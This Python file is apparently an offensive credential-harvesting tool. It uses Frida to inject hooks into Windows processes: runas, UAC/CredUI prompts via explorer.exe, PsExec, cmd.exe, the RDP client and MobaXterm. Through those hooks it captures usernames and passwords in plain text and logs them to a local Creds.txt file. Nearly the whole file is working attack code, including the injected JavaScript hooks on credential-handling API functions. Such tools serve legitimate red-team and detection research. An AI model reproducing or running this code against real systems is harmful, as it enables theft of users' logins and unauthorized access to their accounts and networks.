# Author: Ilan Kalendarov, Twitter: @IKalendarov
# Contributors: NirLevy98
# License: BSD 3-Clause


from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

from typing import List

lockRunas = Lock()  # Locking the run as thread
lockCmd = Lock()  # locking the cmd thread
lockPsExec = Lock()  # locking the PsExec thread
lockRDP = Lock()  # locking the RDP thread
lockMobaXterm = Lock()  # locking the MobaXterm thread


def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
    process_list = list()
    for p in psutil.process_iter(attrs=["name", "exe", "cmdline"]):
        if p.info['name'] in name_list:
            process_list.append(p)
    return process_list


def get_process_by_name(name: str) -> List[psutil.Process]:
    return get_process_by_list_names([name])


def on_message_runas(message, data):
    # Executes when the user enters the password.
    # Then, open the txt file and append it
    print(message)
    if message['type'] == "send":
        with open("Creds.txt", "a") as f:
            f.write(message["payload"] + '\n')
        try:
            lockRunas.release()
            print("[+] Released Lock")
        except Exception:
            pass


def on_message_rdp(message, data):
    # Executes when the user enters the password.
    # Then, open the txt file and append it
    print(message)
    if message['type'] == "send":
        with open("Creds.txt", "a") as f:
            f.write(message["payload"] + '\n')
        try:
            lockRDP.release()
            print("[+] Released Lock")
        except Exception:
            pass


def on_message_cmd(message, data):
    # Executes when the user enters the right keyword from the array above.
    # Then, open the txt file and append it
    arr = ["-p", "pass", "password", "net"]

    if any(name for name in arr if name in message['payload']):
        print(message['payload'])
        with open("Creds.txt", "a") as f:
            f.write(message['payload'] + '\n')
        try:
            lockCmd.release()
            print("[+] Released Lock")
        except Exception:
            pass


def on_message_psexec(message, data):
    # Executes when the user enters the password for PsExec but without any arguments.
    # Then, open the txt file and append it

    print(message)
    if message['type'] == "send":
        with open("Creds.txt", "a") as f:
            f.write(message["payload"] + '\n')
        try:
            lockPsExec.release()
            print("[+] Released Lock")
        except Exception:
            pass


def on_message_MobaXterm(message, data):
    # Executes when the user login to a service in MobaXterm
    # Then, open the txt file and append it

    print(message)
    if message['type'] == "send":
        with open("Creds.txt", "a") as f:
            f.write(message["payload"] + '\n')
        try:
            lockMobaXterm.release()
            print("[+] Released Lock")
        except Exception:
            pass


def on_message_credui(message, data):
    # Executes when the user enters the password inside the Graphical runas prompt.
    # Then, open the txt file and append it

    print(message)
    if message['type'] == "send":
        with open("Creds.txt", "a") as f:
            f.write(message["payload"] + '\n')


def WaitForMobaXterm():
    while True:
        # Trying to find if MobaXterm.exe is running if so, execute the "MobaXterm" function.
        if get_process_by_name("MobaXterm.exe") and not lockMobaXterm.locked():
            lockMobaXterm.acquire()
            print("[+] Found MobaXterm Window")
            MobaXterm()
            sleep(0.5)
        elif not get_process_by_name("MobaXterm.exe") and lockMobaXterm.locked():
            lockMobaXterm.release()
            print("[+] MobaXterm is dead releasing lock")
        else:
            pass
        sleep(0.5)


def MobaXterm():
    try:
        print("[+] Trying To Attach To MobaXterm")
        session = frida.attach("MobaXterm.exe")
        print("[+] Attached to MobaXterm!")
        script = session.create_script("""

		var creds;
		var CharUpperBuffA = Module.findExportByName("User32.dll", "CharUpperBuffA")
		Interceptor.attach(CharUpperBuffA, {
			onEnter: function (args) 
			{
				creds = args[0];
				var data = creds.readAnsiString()

				if (data)
				{
					if(data.includes("rdp:"))
					{
						send("\\n+ Intercepted MobaXterm RDP Credentials\\n" + data)
					}
					if(data.includes(", 22 ,"))
					{
						send("\\n+ Intercepted MobaXterm SSH Credentials\\n" + data)
					}

				}	
			}
		});

		""")
        script.on('message', on_message_MobaXterm)
        script.load()
    except Exception as e:
        print(str(e))


def WaitForRDP():
    while True:
        # Trying to find if rdp is running if so, execute the "RDP" function.
        if (get_process_by_name("mstsc.exe") and not lockRDP.locked()):
            lockRDP.acquire()
            print("[+] Found RDP Window")
            RDP()
            sleep(0.5)

        # If the user regret and they ctrl+c from runas then release the thread lock and start over.
        elif not get_process_by_name("mstsc.exe") and lockRDP.locked():
            lockRDP.release()
            print("[+] RDP is dead releasing lock")
        else:
            pass
        sleep(0.5)


def RDP():
    # Explorer is always running so no while loop is needed.

    # Attaching to the explorer process
    print("[+] Trying To Attach To RDP")
    session = frida.attach("mstsc.exe")
    print("[+]Attached To RDP!")

    # Executing the following javascript
    # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
    script = session.create_script("""

	var username;
	var password;
	var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

	Interceptor.attach(CredUnPackAuthenticationBufferW, {
		onEnter: function (args) 
		{

			username = args[3];
			password = args[7];
		},
		onLeave: function (result)
		{

			var user = username.readUtf16String()
			var pass = password.readUtf16String()

			if (user && pass)
			{
				send("\\n+ Intercepted RDP Credentials\\n" + user + ":" + pass)
			}
		}
	});

	""")
    # If we found the user and pass then execute "on_message_credui" function
    script.on('message', on_message_rdp)
    script.load()


def CredUI():
    # Explorer is always running so no while loop is needed.

    # Attaching to the explorer process
    session = frida.attach("explorer.exe")

    # Executing the following javascript
    # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
    script = session.create_script("""

	var username;
	var password;
	var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

	Interceptor.attach(CredUnPackAuthenticationBufferW, {
		onEnter: function (args) 
		{

			username = args[3];
			password = args[7];
		},
		onLeave: function (result)
		{

			var user = username.readUtf16String()
			var pass = password.readUtf16String()

			if (user && pass)
			{
				send("\\n+ Intercepted UAC Credentials\\n" + user + ":" + pass)
			}
		}
	});

	""")
    # If we found the user and pass then execute "on_message_credui" function
    script.on('message', on_message_credui)
    script.load()
    sys.stdin.read()


def WaitForRunAs():
    while True:
        # Trying to find if runas is running if so, execute the "RunAs" function.
        if get_process_by_name("runas.exe") and not lockRunas.locked():
            lockRunas.acquire()
            print("[+] Found RunAs")
            RunAs()
            sleep(0.5)

        # If the user regret and hey ctrl+c from runas then release the thread lock and start over.
        elif get_process_by_name("runas.exe") is None and lockRunas.locked():
            lockRunas.release()
            print("[+] Runas is dead releasing lock")
        else:
            pass
        sleep(0.5)


def RunAs():
    try:
        # same like the CredUI function.
        print("[+] Trying To Attach To Runas")
        session = frida.attach("runas.exe")
        print("[+] Attached runas!")
        script = session.create_script("""

		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')

		Interceptor.attach(CreateProcessWithLogonW, {
			onEnter: function (args) {


				this.lpUsername = args[0];
				this.lpDomain = args[1];
				this.lpPassword = args[2];
				this.lpCommandLine = args[5];
			},
			onLeave: function (args) {
				send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");


			}
		});

		""")
        script.on('message', on_message_runas)
        script.load()
    except Exception as e:
        print(str(e))


def WaitForPsExec():
    # Different variants for PsExec process..
    PsExecList = ["PsExec64.exe", "PsExec.exe", "psexec.exe"]
    while True:
        # Catch the right process name
        process = get_process_by_list_names(PsExecList)
        if (process):
            processName = process[0].name()
            if len(processName) and not lockPsExec.locked():
                lockPsExec.acquire()
                print("[+] Found {}".format(processName))
                PsExec(processName)
                sleep(0.5)

        elif lockPsExec.locked():
            lockPsExec.release()
            print("[+] PsExec is dead releasing lock")
        else:
            pass
            sleep(0.5)


def PsExec(processName):
    try:
        # Same Like CredUI function
        print("[+] Trying To Attach To {}".format(processName))
        session = frida.attach(processName)  # add diffrent options of psexec
        print("[+] Attached PsExec !")
        script = session.create_script("""

			var WNetAddConnection2W = Module.findExportByName("Mpr.dll", 'WNetAddConnection2W')
				Interceptor.attach(WNetAddConnection2W, {
					onEnter: function (args) {

						this.lpUsername = args[2];
						this.lpPassword = args[1];

					},
					onLeave: function (args) {
						send("\\n=============================" + "\\n[+] Retrieving Creds from PsExec.." + "\\nUsername    : " + this.lpUsername.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+"\\n=============================" );

					}
				});

		""")
        script.on('message', on_message_psexec)
        script.load()

    except Exception as e:
        print(str(e))


def WaitForCmd():
    numOfCmd = []
    while True:
        # Same like WaitForRunAs Function
        cmd_process_list = get_process_by_name("cmd.exe")
        if cmd_process_list:
            for i in cmd_process_list:
                if (i.pid not in numOfCmd):
                    numOfCmd.append(i.pid)
                    lockCmd.acquire()
                    print("[+] Found cmd")
                    Cmd(i.pid)
                    lockCmd.release()
                    sleep(0.5)
        elif (not get_process_by_name("cmd.exe")) and lockCmd.locked():
            lockCmd.release()
            print("[+] cmd is dead releasing lock")
        else:
            pass
        sleep(0.5)


def Cmd(Cmdpid):
    try:
        # Same like CredUI Function.
        print("[+] Trying To Attach To cmd")
        session = frida.attach(Cmdpid)
        print("[+] Attached cmd with pid {}!".format(Cmdpid))
        script = session.create_script("""
			var username;
			var password;
			var RtlInitUnicodeStringEx = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")			
			Interceptor.attach(RtlInitUnicodeStringEx, {
				onEnter: function (args) 
				{
					password = args[1];
				},
				onLeave: function (result)
				{

					var pass = password.readUtf16String();

					if (pass)
					{
						send("\\n+ Intercepted cmd Creds\\n" + ":" + pass);
					}
				}
			});

		""")
        script.on('message', on_message_cmd)
        script.load()

    except Exception as e:
        print(str(e))


if __name__ == "__main__":
    thread = Thread(target=WaitForRunAs)
    thread2 = Thread(target=CredUI)
    thread3 = Thread(target=WaitForPsExec)
    thread4 = Thread(target=WaitForCmd)
    thread5 = Thread(target=WaitForRDP)
    thread6 = Thread(target=WaitForMobaXterm)
    thread.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()
    thread6.start()
    thread.join()
